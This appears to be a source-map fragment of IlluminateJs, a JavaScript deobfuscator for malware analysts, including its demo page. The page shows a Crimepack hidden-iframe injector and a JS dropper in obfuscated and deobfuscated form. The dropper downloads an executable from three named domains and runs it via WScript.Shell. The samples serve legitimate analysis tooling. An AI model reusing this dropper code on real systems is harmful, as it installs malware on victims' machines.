input })\n    }\n  }\n}\n\nfunction _deobfuscate (code: string) {\n  try {\n    const deobfuscated = Babel.transform(code, { plugins: [ deobfuscatePlugin ] }).code\n    return prettier.format(deobfuscated)\n  } catch (e) {\n    console.error(e)\n    return code\n  }\n}\n\nexport default Deobfuscator\n","// @flow\n\nimport React, { Component } from 'react'\n\nexport default class Layout extends Component {\n  render () {\n    return (\n      <div>\n        <div className=\"container\">\n          {this.props.children}\n        </div>\n      </div>\n    )\n  }\n}\n","import React, { Component } from 'react'\nimport Deobfuscator from './Deobfuscator'\nimport Layout from './Layout'\nexport default class Home extends Component {\n\n  render() {\n    return <Layout><Deobfuscator/></Layout>\n  }\n}\n","import React, { Component } from 'react'\n\nimport Layout from './Layout'\nimport * as prettier from 'prettier-standalone' // Very large\nimport CodeEditor from './CodeEditor'\n\nconst samples = {\n    crimepack: \"var tmssqrcaizo = 'WYTUHYjE3cWYTUHYjE69WYTUHYjE66';var makvvxmaqgh = 'WYTUHYjE72';var nlsysoyxklj = 'WYTUHYjE61WYTUHYjE6dWYTUHYjE65WYTUHYjE20WYTUHYjE6eWYTUHYjE61WYTUHYjE6dWYTUHYjE65WYTUHYjE3dWYTUHYjE22';var zezugacgoqg = 'WYTUHYjE6eWYTUHYjE6fWYTUHYjE6aWYTUHYjE72WYTUHYjE73WYTUHYjE65WYTUHYjE72WYTUHYjE66WYTUHYjE6cWYTUHYjE72WYTUHYjE6f';var nmcwycmeknp = 'WYTUHYjE22WYTUHYjE20WYTUHYjE77WYTUHYjE69WYTUHYjE64WYTUHYjE74WYTUHYjE68WYTUHYjE3dWYTUHYjE22WYTUHYjE31WYTUHYjE22WYTUHYjE20WYTUHYjE68WYTUHYjE65WYTUHYjE69WYTUHYjE67WYTUHYjE68WYTUHYjE74WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22';var tmirlfbwofa = 'WYTUHYjE20WYTUHYjE73WYTUHYjE72WYTUHYjE63WYTUHYjE3dWYTUHYjE22';var yzhocnctubf = 'WYTUHYjE68WYTUHYjE74WYTUHYjE74WYTUHYjE70WYTUHYjE3aWYTUHYjE2fWYTUHYjE2f';var pxezkikyynl = 'localhost/index.php';var mewlgszlsol = 'WYTUHYjE22WYTUHYjE20WYTUHYjE6dWYTUHYjE61WYTUHYjE72WYTUHYjE67WYTUHYjE69WYTUHYjE6eWYTUHYjE77WYTUHYjE69WYTUHYjE64WYTUHYjE74WYTUHYjE68WYTUHYjE3dWYTUHYjE22WYTUHYjE31WYTUHYjE22WYTUHYjE20WYTUHYjE6dWYTUHYjE61WYTUHYjE72WYTUHYjE67WYTUHYjE69WYTUHYjE6eWYTUHYjE68WYTUHYjE65WYTUHYjE69WYTUHYjE67WYTUHYjE68WYTUHYjE74WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22WYTUHYjE20WYTUHYjE74WYTUHYjE69WYTUHYjE74WYTUHYjE6cWYTUHYjE65WYTUHYjE3dWYTUHYjE22';var vconehifned = 'WYTUHYjE6eWYTUHYjE6fWYTUHYjE6aWYTUHYjE72WYTUHYjE73WYTUHYjE65WYTUHYjE72WYTUHYjE66WYTUHYjE6cWYTUHYjE72WYTUHYjE6f';var weozomycyeg = 'WYTUHYjE22WYTUHYjE20WYTUHYjE73WYTUHYjE63WYTUHYjE72WYTUHYjE6fWYTUHYjE6cWYTUHYjE6cWYTUHYjE69WYTUHYjE6eWYTUHYjE67WYTUHYjE3dWYTUHYjE22WYTUHYjE6eWYTUHYjE6fWYTUHYjE22WYTUHYjE20WYTUHYjE62WYTUHYjE6fWYTUHYjE72WYTUHYjE64WYTUHYjE65WYTUHYjE72WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22WYTUHYjE20WYTUHYjE66WYTUHYjE72WYTUHYjE61WYTUHYjE6dWYTUHYjE65WYTUHYjE62WYTUHYjE6fWYTUHYjE72WYTUHYjE64WYTUHYjE65WYTUHYjE72WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22WYTUHYjE3e';var zqnnqzfelfg = 'WYTUHYjE3cWYTUHYjE2fWYTUHYjE69WYTUHYjE66';var qtlhbruguml = 'WYTUHYjE72WYTUHYjE61';var xmzvkbtpiof = 'WYTUHYjE6dWYTUHYjE65WYTUHYjE3e';var vbvvhagnggg = new Array();vbvvhagnggg[0]=new Array(tmssqrcaizo+makvvxmaqgh+nlsysoyxklj+zezugacgoqg+nmcwycmeknp+tmirlfbwofa+yzhocnctubf+pxezkikyynl+mewlgszlsol+vconehifned+weozomycyeg+zqnnqzfelfg+qtlhbruguml+xmzvkbtpiof);document['WYTUHYjEwWYTUHYjErWYTUHYjEiWYTUHYjEtWYTUHYjEeWYTUHYjE'.replace(/WYTUHYjE/g,'')](window['WYTUHYjEuWYTUHYjEnWYTUHYjEeWYTUHYjEsWYTUHYjEcWYTUHYjEaWYTUHYjEpWYTUHYjEeWYTUHYjE'.replace(/WYTUHYjE/g,'')](vbvvhagnggg.toString().replace(/WYTUHYjE/g,'%')));\",\n    crimepackDeobfuscated: '/* ............ CUT ............ */\\ndocument.write(\"<iframe name=\"nojrserflro\" width=\"1\" height=\"0\" src=\"http://localhost/index.php\" marginwidth=\"1\" marginheight=\"0\" title=\"nojrserflro\" scrolling=\"no\" border=\"0\" frameborder=\"0\"></iframe>\");',\n    dropper:`var stroke = \"5557545E0D0A020B4A0D1005081D2417130D1717140B17104A070B09\";\nfunction bhj75() {\n    nz('()*1');\n    return lxd();\n};\n\nfunction bhj100() {\n    nz('ys');\n    return lxd();\n};\n\n/* ............ CUT ............ */\n\nfunction bhj197() {\n    nz('stro');\n    return lxd();\n};\n\nfunction bhj168() {\n    nz('cat');\n    return lxd();\n};\nfor (var enpi = 1; enpi <= 226; enpi++) {\n    nz(this['bhj' + enpi]());\n    fvd += lxd();\n}\nthis[xcil() + bhj()](fvd);`,\n    dropperDeobfuscated: `/* ............ CUT ............ */\n    fvd =\n  'function dl(fr) { var b = \"harmacrebar.com readysetgomatthew.com ayuso-arch.com\".split(\" \"); for (var i=0; i<b.length; i++) { var ws = new ActiveXObject(\"WScript.Shell\"); var fn = ws.ExpandEnvironmentStrings(\"%TEMP%\")+String.fromCharCode(92)+Math.round(Math.random()*100000000)+\".exe\"; var dn = 0; var xo = new ActiveXObject(\"MSXML2.XMLHTTP\"); xo.onreadystatechange = function() { if (xo.readyState == 4 && xo.status == 200) { var xa = new ActiveXObject(\"ADODB.Stream\"); xa.open(); xa.type = 1; xa.write(xo.ResponseBody); if (xa.size > 5000) { dn = 1; xa.position = 0; xa.saveToFile(fn,2); try { ws.Run(fn,1,0); } catch (er) {}; }; xa.close(); }; }; try { xo.open(\"GET\",\"http://\"+b[i]+\"/document.php?rnd=\"+fr+\"&id=\"+stroke, false); xo.send(); } catch (er) {}; if (dn == 1) break; }; }; dl(9391); dl(2252); dl(6943);';\nfunction dl(fr) {\n  const b = [\"harmacrebar.com\", \"readysetgomatthew.com\", \"ayuso-arch.com\"];\n  for (var i = 0; i < 3; i++) {\n    const ws = new ActiveXObject(\"WScript.Shell\");\n    const fn =\n      ws.ExpandEnvironmentStrings(\"%TEMP%\") +\n      \"\\\\\" +\n      Math.round(Math.random() * 100000000) +\n      \".exe\";\n    var dn = 0;\n    const xo = new ActiveXObject(\"MSXML2.XMLHTTP\");\n    xo.onreadystatechange = function() {\n      if (xo.readyState == 4 && xo.status == 200) {\n        const xa = new ActiveXObject(\"ADODB.Stream\");\n        xa.open();\n        xa.type = 1;\n        xa.write(xo.ResponseBody);\n        if (xa.size > 5000) {\n          dn = 1;\n          xa.position = 0;\n          xa.saveToFile(fn, 2);\n          try {\n            ws.Run(fn, 1, 0);\n          } catch (er) {}\n        }\n        xa.close();\n      }\n    };\n    try {\n      xo.open(\n        \"GET\",\n        \"http://\" +\n          b[i] +\n          \"/document.php?rnd=\" +\n          fr +\n          \"&id=5557545E0D0A020B4A0D1005081D2417130D1717140B17104A070B09\",\n        false\n      );\n      xo.send();\n    } catch (er) {}\n    if (dn == 1) break;\n  }\n}`\n\n}  \n\nexport default class HowItWorks extends Component {\n\n  render () {\n      return (\n        <Layout>\n            <div>\n            <h2>Intro</h2>\n            <p>\n                IlluminateJs is a <strong>static javascript analysis engine</strong> (a deobfuscator so to say) aimed to help analyst understand obfuscated and potentially malicious JavaScript Code. Consider it like <a href=\"http://www.relentless-coding.com/projects/jsdetox/\" target=\"_blank\" rel=\"noopener noreferrer\">JSDetox</a>, but on steroids.\n                IlluminateJs core is a <a href=\"https://babeljs.io/\" target=\"_blank\" rel=\"noopener noreferrer\">Babel</a> compiler plugin and <strong>it works entirely in your browser</strong>, no server interaction is needed to perform deobfuscation.\n            </p>\n            <h2>Features</h2>\n            <ul>\n                <li>Extended constant propagation</li>\n                <li>Array mutators tracking</li>\n                <li>Mixed-type expressions evaluation</li>\n                <li>Support modern JavaScript (ES6)</li>\n                <li>Function calls evaluation</li>\n                <li>Built-in function evaluation</li>\n                <li>Loops evaluation</li>\n                <li>Procedure inlining</li>\n            </ul>\n            <h2>Examples</h2>\n            <div className=\"sampleContainer\">\n                <h4>Malicious JS Dropper</h4>\n                <div>\n                    <div className=\"sampleLeft\">\n                        <small><u>Obfuscated</u></small>\n                        <CodeEditor readonly=\"true\" code={prettier.format(samples.dropper)}/>\n                    </div>\n\n                    <div className=\"sampleRight\">\n                        <small><u>Deobfuscated</u></small>\n                        <CodeEditor readonly=\"true\" code={samples.dropperDeobfuscated}/>\n                    </div>\n                </div>\n            </div>\n            <div className=\"sampleContainer\"/>\n                <h4>Crimepack Sample</h4>\n                <div>\n                    <div className=\"sampleLeft\">\n                        <small><u>Obfuscated</u></small>\n                        <CodeEditor readonly=\"true\" code={prettier.format(samples.crimepack)}/>\n                    </div>\n\n                    <div className=\"sampleRight\">\n                        <small><u>Deobfuscated</u></small>\n                        <CodeEditor readonly=\"true\" code={samples.crimepackDeobfuscated}/>\n                    </div>\n                </div>\n            </div>\n            <div style={{clear:'both'}}>\n                <h2>Support</h2>\n                <p>For feature suggestions, sample submission and bug reports you can address those at the project <a href=\"https://github.com/geeksonsecurity/illuminatejs\">GitHub Repository</a></p>\n            </div>\n        </Layout>\n      )\n    }\n}","import React, { Component } from 'react'\nimport { Link } from 'react-router-dom'\n\nconst headerStyle = {\n  display: 'flex',\n  alignItems: 'center',\n  backgroundColor: '#222',\n  color: '#E8E6E8',\n  paddingLeft: '15px'\n}\n\nexport default class Header extends Component {\n\n  render() {\n    return <div className='horizontal-spacing' style={headerStyle}>\n      <h2 className=\"logo\"><span className=\"main\">illuminate</span><sub>js</sub> playground</h2>\n      <Link to=\"/\">Home</Link>\n      <Link to=\"/how-it-works\">How it works</Link>\n    </div>\n  }\n}\n","import React, { Component } from 'react'\n\nexport default class Footer extends Component {\n\n  render() {\n    return <div className=\"footer\"><small>&copy; <a href=\"http://geeksonsecurity.com\" target=\"_blank\" rel=\"noopener noreferrer\">GeeksOnSecurity</a>  - Kudos to <a href=\"https://twitter.com/chilloutman\" target=\"_blank\" rel=\"noopener noreferrer\">@chilloutman</a> / <a href=\"https://www.zhaw.ch\" target=\"_blank\" rel=\"noopener noreferrer\">ZHAW</a></small></div>\n  }\n}\n","import React from 'react'\nimport {BrowserRouter,Route} from 'react-router-dom';\nimport ReactDOM from 'react-dom'\nimport './index.css'\nimport Home from './Home'\nimport HowItWorks from './HowItWorks'\nimport Header from './Header'\nimport Footer from './Footer'\n\n\nReactDOM.render((\n  <BrowserRouter>\n    <Header/>\n    <Route exact path=\"/\" component={Home}/>\n    <Route exact path=\"/how-it-works\" component={HowItWorks}/>\n    <Footer/>\n  </BrowserRouter>\n), document.getElementById('root'))\n","\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nvar t = require(\"babel-types\");\nvar builtIns = require(\"./built-ins\");\nvar expressions_1 = require(\"./expressions\");\nfunction evaluateArrayExpression(path) {\n    path.assertArrayExpression();\n    var elements = path.get('elements').map(expressions_1.evaluateExpression);\n    if (elements.some(function (e, i) { return e !== path.node.elements[i]; })) {\n        return t.arrayExpression(elements);\n    }\n    return null;\n}\nexports.evaluateArrayExpression = evaluateArrayExpression;\nfunction getMutatorCalls(binding) {\n    return binding.referencePaths\n        .map(function (p) { return p.parentPath; })\n        .filter(function (p) { return t.isCallExpression(p.parent) && p.key === 'callee' && builtIns.isArrayMutatorFunctionCall(p.parent); })\n        .map(function (p) { return p.parentPath; });\n}\nexports.getMutatorCalls = getMutatorCalls;\n//# sourceMappingURL=arrays.js.map"],"sourceRoot":""}